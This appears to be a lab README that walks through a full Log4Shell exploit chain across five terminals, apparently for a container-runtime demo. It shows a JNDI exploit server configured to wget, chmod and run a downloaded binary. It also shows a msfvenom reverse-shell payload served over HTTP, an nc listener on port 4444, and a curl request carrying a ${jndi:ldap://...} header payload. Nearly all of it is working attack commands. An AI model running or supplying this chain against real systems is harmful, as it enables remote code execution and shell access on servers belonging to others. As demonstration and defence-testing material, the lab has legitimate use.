# Build
```
make docker
```

# Terminal 1 (JNDI Exploit Server)
```
docker run --network=host --rm log4jshell/jndi_exploit_kit

# which starts:
# java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"
```

# Terminal 2 (Vulnerable App)
```
# run vulnerable app
docker run --rm --network=host vulnerable-app

or
# or with Kontain
docker run --rm --runtime=krun --network=host log4jshell/vulnerable-app-kontain

# which exploits:
# logger.info("Received a request for API version " + apiVersion);
```

# Terminal 3 (Dialback Server)
```
# runs: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/rev.elf

cd /tmp
./msfvenom.sh
python3 -m http.server 8082
```

# Terminal 4 (Listening for attack)
```
# ncat receiving dialback
nc -lvnp 4444
```

# Terminal 5 (Send attack command to the Vulnerable App)
```
# curl attack command

curl 127.0.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/xqinla}'
```
